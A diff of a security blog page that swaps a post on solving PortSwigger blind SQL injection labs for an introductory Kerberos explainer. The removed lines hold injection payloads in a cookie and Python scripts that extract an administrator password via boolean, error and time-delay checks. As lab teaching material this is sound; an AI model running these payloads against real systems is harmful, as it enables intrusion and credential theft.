@@ -2,7 +2,7 @@
 <html lang="en-US">
 <head>
   <meta charset="utf-8">
-  <title>Blind SQL with Python</title>
+  <title>Kerberos 101</title>
 
   <meta name="author" content="Themefisher">
   <meta name="description" content="  This is meta description  ">
@@ -209,7 +209,7 @@ AUTHOR WEBSITE: https://themefisher.com
     <div class="row justify-content-center">
       <div class="col-lg-10">
         <div class="text-center mb-5">
-          <h3 class="h2 mb-4 post-title">Blind SQL with Python</h3>
+          <h3 class="h2 mb-4 post-title">Kerberos 101</h3>
           <ul class="card-meta list-inline">
             <li class="list-inline-item">
               <a href="#!" class="card-meta-author">
@@ -218,7 +218,7 @@ AUTHOR WEBSITE: https://themefisher.com
             </li>
             <li class="list-inline-item">|</li>
             <li class="list-inline-item">
-              <span>20 September 2021</span>
+              <span>02 February 2022</span>
             </li>
           </ul>
         </div>
@@ -264,11 +264,11 @@ AUTHOR WEBSITE: https://themefisher.com
 
 
 <picture>
-  <source srcset="/images/post/sqlblind_hue00967bb3e6bc301cd58e1e5e7b49167_75999_545x0_resize_box_2.png" media="(max-width: 575px)">
-  <source srcset="/images/post/sqlblind_hue00967bb3e6bc301cd58e1e5e7b49167_75999_600x0_resize_box_2.png" media="(max-width: 767px)">
-  <source srcset="/images/post/sqlblind_hue00967bb3e6bc301cd58e1e5e7b49167_75999_700x0_resize_box_2.png" media="(max-width: 991px)">
-  <source srcset="/images/post/sqlblind_hue00967bb3e6bc301cd58e1e5e7b49167_75999_1110x0_resize_box_2.png">
-  <img loading="lazy" decoding="async" class="img-fluid rounded" src="/images/post/sqlblind_hue00967bb3e6bc301cd58e1e5e7b49167_75999_1110x0_resize_box_2.png" alt="Post image" width="728" height="410">
+  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_545x0_resize_box_2.png" media="(max-width: 575px)">
+  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_600x0_resize_box_2.png" media="(max-width: 767px)">
+  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_700x0_resize_box_2.png" media="(max-width: 991px)">
+  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_1110x0_resize_box_2.png">
+  <img loading="lazy" decoding="async" class="img-fluid rounded" src="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_1110x0_resize_box_2.png" alt="Post image" width="728" height="410">
 </picture>
  
  
@@ -279,20 +279,24 @@ AUTHOR WEBSITE: https://themefisher.com
         
 
         <div class="content">
-          <p>In this blog we will solve portswigger labs for Blind SQL injection with python</p>
-<h3 id="what-is-blind-sql">What is Blind SQL?</h3>
-<p>It&rsquo;s type of SQL injection happens when the web application is vulnerable but the response doesn&rsquo;t contain results signify of any database errors.</p>
-<h3 id="blind-sql-injection-with-conditional-responses">Blind SQL injection with conditional responses</h3>
-<p>First of all we have a web application that contain TrackingId (Cookie) in request header.</p>
-<p>Cookie: TrackingId= &lsquo;Value&rsquo;</p>
-<p>When the request contain TrackingId Cookie it means that the application determines whether this is a known user using SQL query.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> TrackingId <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">Table_name</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">WHERE</span> TrackingId <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;value&#39;</span>
-</code></pre></div><p>So this query is vulnerable to SQL injection but the result aren&rsquo;t returned to the user, okay let&rsquo;s see what we can do.</p>
-<p>Note: I will solve Portswigger blind SQL labs to describe this techniques.</p>
-<p>Firstly open your burpsuit and run your proxie</p>
-<p>let&rsquo;s test it with basic sql query and see the behavior of the application.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">TrackingId<span style="color:#f92672">=</span>ofa7<span style="color:#e6db74">&#39;+OR+1=1--;
-</span></code></pre></div><p>if we return to the web application we will see that &ldquo;Welcom back&rdquo; message is appeared.</p>
+          <p>First of all in this blog we will discuss an authentication protocol called Kerberos.</p>
+<ul>
+<li><strong>what is Kerberos?</strong></li>
+<li><strong>How does it work?</strong></li>
+<li><strong>Authentication flow</strong></li>
+<li><strong>How can you see your tickets?</strong></li>
+</ul>
+<h3 id="what-is-kerberos">What is Kerberos?</h3>
+<p>Kerberos is an network security authentication protocol  allow nodes to communicate with each other across untrusted network by using tickets, Kerberos builds on symmetric key cryptography and runs as a third party trusted server called Key Distribution Center (KDC), All environment users, machines, service that use Kerberos depend on KDC.</p>
+<h3 id="how-does-it-works">How does it works?</h3>
+<p>Client : its a user who is request the service.</p>
+<p>Server : The service that the client want to access.</p>
+<p>Ticket Granting Ticket (TGT) : Its a user authentication token issued by Key Distribution Center (KDC) used to request access token from (TGS).</p>
+<p>Key Distribution Center (KDC) : The trust third party which contain database and Authentication Service (AS) and the Ticket Granting Server (TGS).</p>
+<p>Authentication Server (AS) : Authenticated service which authenticates client and issues them tickets and (TGS) which accept authenticated clients and issues them tickets to access another recourse.</p>
+<p>Ticket Granting Server (TGS) : Its part of (KDC) That issues a service ticket .</p>
+<p>Note: Before issued service ticket you must have The (TGT) for AD Domain first  .</p>
+<h3 id="authentication-flow">Authentication flow</h3>
 
 
 
@@ -355,7 +359,7 @@ AUTHOR WEBSITE: https://themefisher.com
 
 
 
-<img title="" loading="lazy" decoding="async" class=" " width="318" height="51" src="/images/0_hu0d0d0364f3d8ee832bcc980c03405028_4793_318x51_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/0_hu0d0d0364f3d8ee832bcc980c03405028_4793_318x51_resize_box_2.png'">
+<img title="" loading="lazy" decoding="async" class=" " width="1197" height="597" src="/images/Visio-KerberosComms_hu5970efa1adfb0617dd619e9046ebf215_65291_1197x597_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/Visio-KerberosComms_hu5970efa1adfb0617dd619e9046ebf215_65291_1197x597_resize_box_2.png'">
 
 
 
@@ -363,750 +367,50 @@ AUTHOR WEBSITE: https://themefisher.com
 
 
 
-<p>let&rsquo;s try false condition.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">TrackingId<span style="color:#f92672">=</span>ofa7<span style="color:#e6db74">&#39;+OR+1=2--;
-</span></code></pre></div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="1320" height="542" src="/images/1_huec88ac71747363d7a97ccee8a039c615_82356_1320x542_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/1_huec88ac71747363d7a97ccee8a039c615_82356_1320x542_resize_box_2.png'">
-
-
-
-
-
-
-
-<p>now we verify the payload, seconed step we will Enumerate for tables and i will using python for this.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">ofa7<span style="color:#e6db74">&#39;UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39; FROM &lt;Table_Name&gt; WHERE 1=1--
-</span></code></pre></div><p>I have a list of table names.</p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="128" height="434" src="/images/2_hu5699c02a0d040fb903e025c2577b223d_16294_128x434_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/2_hu5699c02a0d040fb903e025c2577b223d_16294_128x434_resize_box_2.png'">
-
-
-
-
-
-
-
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
-<span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
-        
-url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#laburl</span>
-trust_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome back&#34;</span>
-result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-Table_name <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>]
-names <span style="color:#f92672">=</span> open(Table_name,<span style="color:#e6db74">&#34;r&#34;</span>)
-Try <span style="color:#f92672">=</span> list(<span style="color:#e6db74">&#34;&#34;</span>)
-
-<span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> names:
-    Try<span style="color:#f92672">.</span>append(n<span style="color:#f92672">.</span>strip())
-    
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Extract Info&#34;</span>)
-
-<span style="color:#66d9ef">for</span> T <span style="color:#f92672">in</span> Try:
-    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ofa7&#39;UNION SELECT &#39;a&#39; FROM </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> WHERE 1=1--&#34;</span> <span style="color:#f92672">%</span>T
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Trying Table Name : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span>T)
-    cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;TrackingId&#34;</span>:payload}
-    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>cookie)
-
-    <span style="color:#66d9ef">if</span> trust_string <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>):
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Result is : &#34;</span>, T)
-        <span style="color:#66d9ef">break</span>
-</code></pre></div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="286" height="81" src="/images/3_hud8ae336f5203491d5f4343acd09eee3c_10027_286x81_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/3_hud8ae336f5203491d5f4343acd09eee3c_10027_286x81_resize_box_2.png'">
-
-
-
-
-
-
-
-<p>we got the Table_Name : users</p>
-<p>now let&rsquo;s enumerate the columns, we need to know the column that the administrator is part of it. so the query will be.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">ofa7<span style="color:#e6db74">&#39;UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39; FROM users WHERE %s=&#34;administrator&#34;--
-</span></code></pre></div><p>all we will do that change the payload from the code</p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="281" height="134" src="/images/4_hu23f5d05b87fe3bd7deea169f40bfe3e3_11883_281x134_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/4_hu23f5d05b87fe3bd7deea169f40bfe3e3_11883_281x134_resize_box_2.png'">
-
-
-
-
-
-
-
-<p>and now we have Column_Name too : username</p>
-<p>another way to enumerate columns:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">ofa7<span style="color:#e6db74">&#39;UNION SELECT column_name FROM information_schema.columns WHERE table_name=&#39;</span>users<span style="color:#e6db74">&#39; And column_name LIKE &#39;</span><span style="color:#f92672">%</span>s<span style="color:#e6db74">&#39;—
-</span></code></pre></div><p>Enumerate for second column.</p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="320" height="151" src="/images/5_hu5257e15d5a2db0571c240fe12508762a_13213_320x151_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/5_hu5257e15d5a2db0571c240fe12508762a_13213_320x151_resize_box_2.png'">
-
-
-
-
-
-
-
-<p>to Enumerate for password length use:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">ofa7<span style="color:#e6db74">&#39;AND (SELECT &#39;</span>a<span style="color:#e6db74">&#39; FROM users WHERE username=&#39;</span>administrator<span style="color:#e6db74">&#39; AND LENGTH(password)&gt;%i)=&#39;</span>a
-</code></pre></div><p>final payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">ofa7<span style="color:#e6db74">&#39;UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39; from users WHERE username = &#39;</span>administrator<span style="color:#e6db74">&#39; AND substring(password,%i,1)=&#39;</span><span style="color:#f92672">%</span>s<span style="color:#e6db74">&#39;--
-</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
-<span style="color:#f92672">import</span> string
-
-characters <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase)
-characters <span style="color:#f92672">+=</span> list(string<span style="color:#f92672">.</span>digits)
-url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#Target URL</span>
-length <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
-trust_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome back!&#34;</span>
-result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Extract Info&#34;</span>)
-
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, length<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
-    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> characters:
-    	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ofa7&#39;UNION SELECT &#39;a&#39; from users WHERE username = &#39;administrator&#39; AND substring(password,</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;--&#34;</span> <span style="color:#f92672">%</span>(i, char)
-    	<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Trying Number </span><span style="color:#e6db74">%i</span><span style="color:#e6db74"> with: &#34;</span> <span style="color:#f92672">%</span>(i), char)
-    	cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;TrackingId&#34;</span>:payload}
-    	response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>cookie)
-    	<span style="color:#66d9ef">if</span> trust_string <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>):
-    		result <span style="color:#f92672">+=</span> char
-    		<span style="color:#66d9ef">break</span>
-
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Result is : &#34;</span>, result)
-</code></pre></div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="308" height="26" src="/images/6_hu9668d4328f4e9e4aba4f5e16a5dafa75_5019_308x26_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/6_hu9668d4328f4e9e4aba4f5e16a5dafa75_5019_308x26_resize_box_2.png'">
-
-
-
-
-
-
-
-<h3 id="blind-sql-with-conditional-error">Blind SQL with conditional error</h3>
-<p>Password Length</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;|| (SELECT CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM &lt;TABLE&gt; WHERE &lt;Column&gt; = &#39;</span>...<span style="color:#e6db74">&#39;)||&#39;</span>
-</code></pre></div><p>Password BruteForce</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;</span>a<span style="color:#e6db74">&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;</span>administrator<span style="color:#e6db74">&#39;)||&#39;</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
-<span style="color:#f92672">import</span> string
-
-characters <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase)
-characters <span style="color:#f92672">+=</span> list(string<span style="color:#f92672">.</span>digits)
-url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#Target URL</span>
-length <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
-result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Extract Info&#34;</span>)
-
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, length<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
-    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> characters:
-        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#39;||(SELECT CASE WHEN SUBSTR(password,</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;&#34;</span> <span style="color:#f92672">%</span>(i, char)
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Tring Number </span><span style="color:#e6db74">%i</span><span style="color:#e6db74"> with: &#34;</span> <span style="color:#f92672">%</span>(i), char)
-        cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;TrackingId&#34;</span>:payload}
-        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>cookie)
-        <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">500</span>:
-            result <span style="color:#f92672">+=</span> char
-            <span style="color:#66d9ef">break</span>
-
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Result is : &#34;</span>, result)
-</code></pre></div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="317" height="25" src="/images/7_hu4a5dab0fd1239858b9cc427679cfde04_4679_317x25_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/7_hu4a5dab0fd1239858b9cc427679cfde04_4679_317x25_resize_box_2.png'">
-
-
-
-
-
-
-
-<h3 id="blind-sql-injection-with-time-delays-and-information-retrieval">Blind SQL injection with time delays and information retrieval</h3>
-<p>Microsoft SQL Server.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;; IF (1=2) WAITFOR DELAY &#39;</span><span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">10</span><span style="color:#e6db74">&#39;—
-</span></code></pre></div><p>PostgreSQL.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;||pg_sleep(5)—
-</span></code></pre></div><h3 id="blind-sql-injection-with-time-delays-and-information-retrieval-1">Blind SQL injection with time delays and information retrieval</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">a<span style="color:#e6db74">&#39;%%3BSELECT+CASE+WHEN+(username=&#39;</span>administrator<span style="color:#e6db74">&#39;+AND+SUBSTRING(password,%i,1)=&#39;</span><span style="color:#f92672">%</span>s<span style="color:#e6db74">&#39;)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users—
-</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
-<span style="color:#f92672">import</span> string
-<span style="color:#f92672">from</span> requests.exceptions <span style="color:#f92672">import</span> Timeout
-
-characters <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase)
-characters <span style="color:#f92672">+=</span> list(string<span style="color:#f92672">.</span>digits)
-url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">#Target URL</span>
-length <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
-result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Extract Info&#34;</span>)
-
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, length<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
-    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> characters:
-        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#39;</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+SUBSTRING(password,</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--&#34;</span> <span style="color:#f92672">%</span>(i, char)
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Tring Number </span><span style="color:#e6db74">%i</span><span style="color:#e6db74"> with: &#34;</span> <span style="color:#f92672">%</span>(i), char)
-        cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;TrackingId&#34;</span>:payload}
-        <span style="color:#66d9ef">try</span>:
-            requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>cookie , timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
-        <span style="color:#66d9ef">except</span> Timeout:
-            result <span style="color:#f92672">+=</span> char
-            <span style="color:#66d9ef">break</span>
-
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Result is : &#34;</span>, result)
-</code></pre></div><p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="308" height="23" src="/images/8_hu4690564db6d141ed73102665f71004ad_4969_308x23_resize_box_2.png" alt="" onerror="this.onerror='null';this.src='\/images\/8_hu4690564db6d141ed73102665f71004ad_4969_308x23_resize_box_2.png'">
-
-
-
-
-
-
-
-<br>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<img title="" loading="lazy" decoding="async" class=" " width="480" height="400" src="/images/bye.gif" alt="" onerror="this.onerror='null';this.src=''">
-
-
-
-
-
-
-</p>
+<ul>
+<li>
+<h5 id="as-req-request-tgt">AS REQ (request TGT)</h5>
+</li>
+</ul>
+<p>The User Asks for the (TGT) From Authentication Server (AS).</p>
+<p>The request include the user principle Name (UPN) and timestamp , and its encrypts using the user password hash.</p>
+<ul>
+<li>
+<h5 id="as-rep-receive-tgt">AS REP (receive TGT)</h5>
+</li>
+</ul>
+<p>Verify User&rsquo;s Creds</p>
+<p>The KDC uses the UPN and search for the User in its database and uses the password hash to decrypt the message if is successfully decrypts the request and if the timestamp within the KDS&rsquo;s configured time, the authentication is successful.</p>
+<p>The Authentication Server computes (TGS) secret key then create a session key (sk1) encrypted by User secret key, then Authentication server generate a (TGT) contain the User ID , User network address, timestamp, lifetime, and SK1 the (TGS) secret key then encrypts the ticket .</p>
+<p>The User Decrypt the message by using its secret key and extract the (SK1) and (TGT) to create the authenticator that validates the User&rsquo;s (TGS) .</p>
+<ul>
+<li>
+<h5 id="tgs-req-present-tgt-request-tgs">TGS REQ (Present TGT, request TGS)</h5>
+</li>
+</ul>
+<p>The User send the present (TGT) to request (TGS)</p>
+<ul>
+<li>
+<h5 id="tgs-rep-receive-tgs">TGS REP (receive TGS)</h5>
+</li>
+</ul>
+<p>the KDC validates the (TGT), Then Generate the (TGS), The (TGS) uses (TGS) secret key to decrypt the (TGT) that received from user and extract the (SK1) and checks the user ID , network address and timestamp to make sure the (TGT) has not expired .</p>
+<p>if all checks are successful then the (KDC) generate a service session key (SK2) that is shared between the User and the target server .</p>
+<p>Then the (KDC) create service ticket that contain User ID, network address, timestamp and (SK2) , The ticket will encrypted with server secret key , then the User receive a message with the service ticket and (SK2) , all encrypted with (SK1) .</p>
+<ul>
+<li>
+<h5 id="ap-req-present-tgs-for-access">AP REQ (present TGS for access)</h5>
+</li>
+</ul>
+<p>The target serve uses the server session key to decrypt the ticket and extract the (SK2) to decrypt the authenticator then checks the User ID, network address , also the server checks if the server ticket is expired .</p>
+<ul>
+<li>
+<h5 id="ap-rep-optional-used-when-mutual-authentication-is-requests">AP REP (optional, used when mutual authentication is requests)</h5>
+</li>
+</ul>
+<p>once check is finished the User receive message from Application server for verifying that they can authenticate each other .</p>
+<h3 id="how-can-you-see-your-tickets">How can you see your tickets?</h3>
+<p>you can see all Kerberos ticket by using klist.exe you can view all issues tickets to you on your computer, you can use klist tickets command on cmd or power shell</p>
 
         </div>
       </div>
@@ -1117,9 +421,9 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
         <div class="col-lg-5 col-md-6 text-center text-md-left">
           <ul class="post-meta-tags list-unstyled list-inline">
             
-            <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/web">Web</a></li>
+            <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/network">Network</a></li>
             
-            <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/sql-injection">Sql Injection</a></li>
+            <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/active-directory">Active-Directory</a></li>
             
           </ul>
         </div>
@@ -1127,7 +431,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 <ul class="social-links has-bg-color list-unstyled list-inline" style="line-height:0">
   <li class="list-inline-item">
     
-    <a class="resp-sharing-button__link d-block" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fdragonpwn.github.io%2fblog%2fblind-sql%2f" target="_blank"
+    <a class="resp-sharing-button__link d-block" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fdragonpwn.github.io%2fblog%2fkerberos101%2f" target="_blank"
       rel="noopener" aria-label="">
       <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small">
         <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
@@ -1139,7 +443,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 
   <li class="list-inline-item">
     
-    <a class="resp-sharing-button__link d-block" href="https://twitter.com/intent/tweet/?text=Blind%20SQL%20with%20Python&amp;url=https%3a%2f%2fdragonpwn.github.io%2fblog%2fblind-sql%2f"
+    <a class="resp-sharing-button__link d-block" href="https://twitter.com/intent/tweet/?text=Kerberos%20101&amp;url=https%3a%2f%2fdragonpwn.github.io%2fblog%2fkerberos101%2f"
       target="_blank" rel="noopener" aria-label="">
